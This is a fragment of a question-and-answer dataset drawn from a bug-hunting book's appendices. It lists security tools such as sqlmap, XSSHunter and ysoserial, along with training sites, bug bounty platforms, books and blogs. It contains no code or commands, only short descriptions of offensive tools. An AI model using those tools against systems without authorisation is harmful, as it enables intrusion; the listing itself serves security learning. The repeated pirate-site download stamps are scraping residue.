CLI\ndescribed in the bug report “HackerOne S3 Buckets Open” on\npage 223.\n362\nDownload from www.finelybook.com 7450911@qq.com\nCyberChef\nCyberChef (https://gchq.github.io/CyberChef/) is a Swiss army\nknife of encoding and decoding tools.\nGitrob\nGitrob (https://github.com/michenriksen/gitrob/) helps you find\npotentially sensitive files that have been pushed to public\nrepositories on GitHub. Gitrob clones repositories belonging to a\nuser or organization down to a configurable depth and iterates\nthrough the commit history and flag files that match signatures for\npotentially sensitive files. It presents its findings via a web\ninterface for easy browsing and analysis.\nOnline Hash Crack\nOnline Hash Crack (https://www.onlinehashcrack.com/) attempts\nto recover passwords in hash form, WPA dumps, and MS Office\nencrypted files. It supports the identification of more than 250\nhash types and is useful when you want to identify the type of\nhash a website uses.\nsqlmap\nYou can use the open source penetration tool sqlmap\n(http://sqlmap.org/) to automate the process of detecting and\nexploiting SQL injection vulnerabilities. The website has a list of\nfeatures, including support for the following:\nA wide range of database types, such as MySQL, Oracle, PostgreSQL,\nMS SQL Server, and others\nSix SQL injection techniques\nUser, password hash, privilege, role, database, table, and column\n363\nDownload from www.finelybook.com 7450911@qq.com\nenumeration\nXSSHunter\nXSSHunter (https://xsshunter.com/) helps you find blind XSS\nvulnerabilities. After signing up for XSSHunter, you get an xss.ht\nshort domain that identifies your XSS and hosts your payload.\nWhen the XSS fires, it automatically collects information about\nwhere it occurred and sends you an email notification.\nYsoserial\nYsoserial (https://github.com/frohoff/ysoserial/) is a proof-of-\nconcept tool for generating payloads that exploit unsafe Java\nobject deserialization.\nMOBILE\nAlthough most of the bugs in this book were found through web\nbrowsers, in some cases, you’ll need to analyze mobile apps as part of\nyour testing. Being able to break down and analyze the apps’s\ncomponents will help you learn how they work and how they might be\nvulnerable.\ndex2jar\nThe dex2jar (https://sourceforge.net/projects/dex2jar/) set of\nmobile hacking tools converts dalvik executables (.dex files) to\nJava .jar files, which makes auditing Android APKs much easier.\nHopper\nHopper (https://www.hopperapp.com/) is a reverse engineering\ntool that lets you disassemble, decompile, and debug applications.\n364\nDownload from www.finelybook.com 7450911@qq.com\nIt’s useful for auditing iOS applications.\nJD-GUI\nJD-GUI (https://github.com/java-decompiler/jd-gui/) helps you\nexplore Android apps. It’s a stand-alone graphical utility that\ndisplays Java sources from CLASS files.\nBROWSER PLUG-INS\nFirefox has several browser plug-ins you can use in combination with\nyour other tools. Although I’ve covered only the Firefox versions of\nthe tools here, there might be equivalent tools you can use on other\nbrowsers.\nFoxyProxy\nFoxyProxy is an advanced proxy management add-on for Firefox.\nIt improves Firefox’s built-in proxy capabilities.\nUser Agent Switcher\nUser Agent Switcher adds a menu and toolbar button in the\nFirefox browser that allows you to switch your user agent. You\ncan use this feature to spoof your browser while performing some\nattacks.\nWappalyzer\nWappalyzer helps you identify the technologies a site uses, such as\nCloudFlare, Frameworks, JavaScript libraries, and so on.\n365"
  },
  {
    "input": "What are some recommended online training platforms, bug bounty platforms, and resources for learning and practicing bug hunting techniques?",
    "summary": "This appendix lists resources for expanding your bug-hunting skills, including online training platforms like Coursera, The Exploit Database, and Google Gruyere, as well as bug bounty platforms such as HackerOne and Bugbounty JP. It also recommends books, blogs, and video tutorials for learning and practicing security techniques. Additionally, it highlights various blogs and websites where bug hunters share insights and discoveries.",
    "output": "Download from www.finelybook.com 7450911@qq.com\nB\nRESOURCES\nThis appendix contains a list of resources you can use to expand your\nskill set. The links to these resources and others are also available at\nhttps://www.torontowebsitedeveloper.com/hacking-resources/ and the\nbook’s web page at https://nostarch.com/bughunting/.\nONLINE TRAINING\nIn this book, I show you how vulnerabilities work using real bug\nreports. Although after reading the book, you should have a practical\nunderstanding of how to find vulnerabilities, you should never stop\nlearning. You can access many online bug-hunting tutorials, formal\ncourses, practice exercises, and blogs to continue expanding your\nknowledge and putting your skills to the test.\nCoursera\nCoursera is similar to Udacity but partners with post secondary\ninstitutions to provide university-level courses rather than working\nwith companies and industry professionals. Coursera offers a\n366\nDownload from www.finelybook.com 7450911@qq.com\nCybersecurity Specialization\n(https://www.coursera.org/specializations/cyber-security/) that\nincludes five courses. I haven’t taken the specialization course but\nfound the Course 2: Software Security videos very informative.\nThe Exploit Database\nAlthough not a traditional online training course, the Exploit\nDatabase (https://www.exploit-db.com/) documents vulnerabilities\nand often links them to common vulnerabilities and exposures\n(CVEs) when possible. Using the code snippets in the database\nwithout understanding them can be dangerous and destructive, so\nmake sure you take a close look at each before attempting to use\nthem.\nGoogle Gruyere\nGoogle Gruyere (https://google-gruyere.appspot.com/) is a\nvulnerable web application with tutorials and explanations for you\nto work through. You can practice finding common vulnerabilities,\nsuch as XSS, privilege escalation, CSRF, path traversal, and other\nbugs.\nHacker101\nHacker101 (https://www.hacker101.com/), run by HackerOne, is a\nfree educational site for hackers. It is designed as a capture the\nflag game to allow you to hack in a safe, rewarding environment.\nHack The Box\nHack The Box (https://www.hackthebox.eu/) is an online platform\nthat allows you to test your penetration testing skills and exchange\nideas and methodologies with other site members. It contains\n367\nDownload from www.finelybook.com 7450911@qq.com\nseveral challenges, some of them simulating real-world scenarios\nand some of them leaning more toward capture the flag, that are\nfrequently updated.\nPentesterLab\nPentesterLab (https://pentesterlab.com/) provides vulnerable\nsystems that you can use to test and understand vulnerabilities.\nExercises are based on common vulnerabilities found in different\nsystems. Instead of made-up issues, the site provides real systems\nwith real vulnerabilities. Some lessons are available for free, and\nothers require a Pro membership. The membership is well worth\nthe investment.\nUdacity\nUdacity hosts free online courses in a variety of subjects,\nincluding web development and programming. I recommend\nchecking out Intro to HTML and CSS\n(https://www.udacity.com/course/intro-to-html-and-css--ud304/),\nJavaScript Basics (https://www.udacity.com/course/javascript-\nbasics--ud804/), and Intro to Computer Science\n(https://www.udacity.com/course/intro-to-computer-science--\ncs101/).\nBUG BOUNTY PLATFORMS\nAlthough all web applications run the risk of containing bugs, it hasn’t\nalways been possible to easily report vulnerabilities. Currently, there\nare many bug bounty platforms to choose from that connect hackers to\ncompanies that need vulnerability testing.\n368\nDownload from www.finelybook.com 7450911@qq.com\nBounty Factory\nBounty Factory (https://bountyfactory.io/) is a European bug\nbounty platform that follows European rules and legislation. It’s\nnewer than HackerOne, Bugcrowd, Synack, and Cobalt.\nBugbounty JP\nBugbounty JP (https://bugbounty.jp/) is another new platform,\nconsidered Japan’s first bug bounty platform.\nBugcrowd\nBugcrowd (https://www.bugcrowd.com/) is another bug bounty\nplatform that connects hackers with programs by validating bugs\nand then sending reports to the companies. Bugcrowd includes\nnonpaying vulnerability disclosure programs and paying bug\nbounty programs. The platform also operates public and invite-\nonly programs, and it manages programs on Bugcrowd.\nCobalt\nCobalt (https://cobalt.io/) is a company that provides pentesting as\na service. Similar to Synack, Cobalt is a closed platform and\nparticipation requires preapproval.\nHackerOne\nHackerOne (https://www.hackerone.com/) was started by hackers\nand security leaders who were driven by the passion to make the\ninternet safer. The platform connects hackers who want to\nresponsibly disclose bugs to companies who want to receive them.\nThe HackerOne platform includes nonpaying vulnerability\ndisclosure programs and paying bug bounty programs. Programs\non HackerOne can be private, by invitation only, or public. As of\n369\nDownload from www.finelybook.com 7450911@qq.com\nthis writing, HackerOne is the only platform that allows hackers to\npublicly disclose bugs on on their platform, as long as the program\nthat resolves the bug consents.\nIntigriti\nIntigriti (https://www.intigriti.com/) is another new crowdsourced\nsecurity platform. It aims to identify and tackle vulnerabilities in a\ncost-efficient way. Their managed platform facilitates online\nsecurity testing through collaboration with experienced hackers\nwith a strong European focus.\nSynack\nSynack (https://www.synack.com/) is a private platform that offers\ncrowdsourced penetration testing. Participating on the Synack\nplatform requires preapproval, including the completion of tests\nand interviews. Similar to Bugcrowd, Synack manages and\nvalidates all reports before forwarding them to the participating\ncompanies. Typically, reports on Synack are validated and\nrewarded within 24 hours.\nZerocopter\nZerocopter (https://www.zerocopter.com/) is another newer bug\nbounty platform. At the time of this writing, participating on the\nplatform requires preapproval.\nRECOMMENDED READING\nWhether you’re looking for a book or free online readings, many\nresources are available for new and experienced hackers.\n370\nDownload from www.finelybook.com 7450911@qq.com\nA Bug Hunter’s Diary\nA Bug Hunter’s Diary by Tobias Klein (No Starch Press, 2011)\nexamines real-world vulnerabilities and the custom programs used\nto find and test bugs. Klein also provides insight into how to find\nand test memory-related vulnerabilities.\nThe Bug Hunters Methodology\nThe Bug Hunters Methodology is a GitHub repository maintained\nby Bugcrowd’s Jason Haddix. It provides some awesome insight\ninto how successful hackers approach a target. It’s written in\nMarkdown and was a result of Jason’s DefCon 23 presentation,\n“How to Shot Web: Better Hacking in 2015.” You can find it at\nhttps://github.com/jhaddix/tbhm/ along with Haddix’s other\nrepositories.\nCure53 Browser Security White Paper\nCure53 is a group of security experts who provide penetration\ntesting services, consulting, and security advice. Google\ncommissioned the group to create a browser-security white paper,\nwhich is available free of charge. The paper seeks to be as\ntechnically driven as possible and documents past research\nfindings alongside newer, innovative findings. You can read the\nwhite paper at https://github.com/cure53/browser-sec-whitepaper/.\nHackerOne Hacktivity\nHackerOne’s Hacktivity feed\n(https://www.hackerone.com/hacktivity/) lists all vulnerabilities\nreported from its bounty program. Although not all the reports are\npublic, you can find and read disclosed reports to learn techniques\n371\nDownload from www.finelybook.com 7450911@qq.com\nfrom other hackers.\nHacking, 2nd Edition\nHacking: The Art of Exploitation, by Jon Erikson (No Starch\nPress, 2008) focuses on memory-related vulnerabilities. It explores\nhow to debug code, examine overflowing buffers, hijack network\ncommunications, bypass protections, and exploit cryptographic\nweaknesses.\nMozilla’s Bug Tracker System\nMozilla’s bug tracker system (https://bugzilla.mozilla.org/)\nincludes all security-related issues reported to Mozilla. This is a\ngreat resource to read about the bugs that hackers have found and\nhow Mozilla has handled them. It might even allow you to find\naspects of Mozilla’s software where the company’s fix hasn’t been\ncomplete.\nOWASP\nThe Open Web Application Security Project (OWASP) is a\nmassive source of vulnerability information hosted at\nhttps://owasp.org. The site offers a convenient Security101\nsection, cheat sheets, testing guides, and in-depth descriptions of\nmost types of vulnerabilities.\nThe Tangled Web\nThe Tangled Web by Michal Zalewski (No Starch Press, 2012)\nexamines the entire browser security model to reveal weak points\nand provide crucial information about web application security.\nAlthough some of the content is dated, the book provides great\ncontext for current browser security and insight into where and\n372\nDownload from www.finelybook.com 7450911@qq.com\nhow to find bugs.\nTwitter Tags\nAlthough Twitter contains a lot of noise, it also has many\ninteresting security- and vulnerability-related tweets under the\n#infosec and #bugbounty hashtags. These tweets often link to\ndetailed write-ups.\nThe Web Application Hacker’s Handbook, 2nd Edition\nThe Web Application Hacker’s Handbook by Dafydd Stuttard and\nMarcus Pinto (Wiley, 2011) is a must-read for hackers. Written by\nthe creators of Burp Suite, it covers common web vulnerabilities\nand provides a methodology for bug hunting.\nVIDEO RESOURCES\nIf you prefer more visual, step-by-step walkthroughs or even advice\ndirectly from other hackers, you can often find bug bounty videos to\nwatch. Several video tutorials are dedicated to bug hunting, but you\ncan also access talks from bug bounty conferences to learn new\ntechniques.\nBugcrowd LevelUp\nLevelUp is Bugcrowd’s online hacking conference. It includes\npresentations on a variety of topics by hackers in the bug bounty\ncommunity. Examples include web, mobile, and hardware\nhacking; tips and tricks; and advice for beginners. Bugcrowd’s\nJason Haddix also presents an in-depth explanation of his\napproach to recon and information collection each year. If you\nwatch nothing else, make sure you watch his talks.\n373\nDownload from www.finelybook.com 7450911@qq.com\nYou can find the 2017 conference talks at\nhttps://www.youtube.com/playlist?list=PLIK9nm3mu-S5InvR-\nmyOS7hnae8w4EPFV and the 2018 talks at\nhttps://www.youtube.com/playlist?list=PLIK9nm3mu-\nS6gCKmlC5CDFhWvbEX9fNW6.\nLiveOverflow\nLiveOverflow (https://www.youtube.com/LiveOverflowCTF/)\npresents a series of videos by Fabian Fäßler that share hacking\nlessons Fabian wished he had when he started. It covers a wide\nrange of hacking topics, including CTF challenge walkthroughs.\nWeb Development Tutorials YouTube\nI host a YouTube channel called Web Development Tutorials\n(https://www.youtube.com/yaworsk1/), which features several\nseries. My Web Hacking 101 series showcases interviews with top\nhackers, including Frans Rosen, Arne Swinnen, FileDescriptor,\nRon Chan, Ben Sadeghipour, Patrik Fehrenbach, Philippe\nHarewood, Jason Haddix, and others. My Web Hacking Pro Tips\nseries provides deep-dive discussions of a hacking idea, technique,\nor vulnerability with another hacker, frequently Bugcrowd’s Jason\nHaddix.\nRECOMMENDED BLOGS\nAnother resource you’ll find useful is blogs written by bug hunters.\nBecause HackerOne is the only platform that discloses reports directly\non its website, many disclosures are posted to the bug hunter’s social\nmedia accounts. You’ll also find several hackers who create tutorials\nand lists of resources specifically for beginners.\n374\nDownload from www.finelybook.com 7450911@qq.com\nBrett Buerhaus’s Blog\nBrett Buerhaus’s personal blog (https://buer.haus/) details\ninteresting bugs from high-profile bounty programs. His posts\ninclude technical details about how he found bugs with the\nintention of helping others learn.\nBugcrowd Blog\nThe Bugcrowd blog (https://www.bugcrowd.com/about/blog/)\nposts some very useful content, including interviews with\nawesome hackers and other informative material.\nDetectify Labs Blog\nDetectify is an online security scanner that uses issues and bugs\nfound by ethical hackers to detect vulnerabilities in web\napplications. Frans Rosen and Mathias Karlsson, among others,\nhave contributed some valuable write-ups to the blog\n(https://labs.detectify.com/).\nThe Hacker Blog\nThe Hacker Blog, accessible at https://thehackerblog.com/, is\nMatthew Bryant’s personal blog. Bryant is the author of some\ngreat hacking tools, perhaps most notably XSSHunter, which you\ncan use you can use to discover blind XSS vulnerabilities. His\ntechnical and in-depth write-ups usually involve extensive security\nresearch.\nHackerOne Blog\nThe HackerOne blog (https://www.hackerone.com/blog/) also\nposts useful content for hackers, such as recommended blogs, new\nfunctionality on the platform (a good place to look for new\n375\nDownload from www.finelybook.com 7450911@qq.com\nvulnerabilities!), and tips on becoming a better hacker.\nJack Whitton’s Blog\nJack Whitton, a Facebook security engineer, was the second-\nranked hacker in the Facebook Hacking Hall of Fame before he\nwas hired. You can access his blog at https://whitton.io/. He\ndoesn’t post often, but when he does, the disclosures are in-depth\nand informative.\nlcamtuf’s Blog\nMichal Zalewski, author of the Tangled Web, has a blog at\nhttps://lcamtuf.blogspot.com/. His posts include advanced topics\nthat are great for after you’ve gotten your feet wet.\nNahamSec\nNahamSec (https://nahamsec.com/) is a blog written by Ben\nSadeghipour, a top hacker on HackerOne who also goes by the\nhandle NahamSec. Sadeghipour tends to share unique and\ninteresting write-ups, and he was the first person I interviewed for\nmy Web Hacking Pro Tips series.\nOrange\nOrange Tsai’s personal blog (http://blog.orange.tw/) has great\nwrite-ups dating back to 2009. In recent years, he has presented\nhis technical findings at Black Hat and DefCon.\nPatrik Fehrenbach’s Blog\nIn this book, I included a number of vulnerabilities Patrik\nFehrenbach has found, and he has even more on his blog,\nhttps://blog.it-securityguard.com/.\n376\nDownload from www.finelybook.com 7450911@qq.com\nPhilippe Harewood’s Blog\nPhilippe Harewood is an awesome Facebook hacker who shares an\nincredible amount of information about finding logic flaws in\nFacebook. You can access his blog at\nhttps://philippeharewood.com/. I was lucky enough to interview\nPhilippe in April 2016 and can’t emphasize enough how smart he\nis and how remarkable his blog is: I’ve read every post.\nPortswigger Blog\nThe team at Portswigger, which is responsible for developing Burp\nSuite, often posts about findings and write-ups on its blog at\nhttps://portswigger.net/blog/. James Kettle, the lead researcher at\nPortswigger, has also presented repeatedly at Black Hat and\nDefCon about his security findings.\nProject Zero Blog\nGoogle’s elite hacker group Project Zero has a blog at\nhttps://googleprojectzero.blogspot.com/. The Project Zero team\ndetails complex bugs across a wide variety of applications,\nplatforms, and so on. The posts are advanced, so you might have\ndifficulty understanding the details if you’re just learning to hack.\nRon Chan’s Blog\nRon Chan runs a personal blog detailing bug bounty write-ups at\nhttps://ngailong.wordpress.com/. At the time of this writing, Chan\nwas the top hacker on Uber’s bug bounty program and third on\nYahoo’s, which is impressive considering he only signed up on\nHackerOne in May 2016.\nXSS Jigsaw\n377\nDownload from www.finelybook.com 7450911@qq.com\nXSS Jigsaw (https://blog.innerht.ml/) is an amazing blog written\nby FileDescriptor, a top hacker on HackerOne, who is also this\nbook’s technical reviewer. FileDescriptor has found several bugs\non Twitter, and his posts are extremely detailed, technical, and\nwell written. He’s also a Cure53 member.\nZeroSec\nAndy Gill, a bug bounty hacker and penetration tester, maintains\nthe ZeroSec blog (https://blog.zsec.uk/). Gill covers a variety of\nsecurity-related topics and wrote the book Breaking into\nInformation Security: Learning the Ropes 101, which is available\non Leanpub.\n378"
  }
]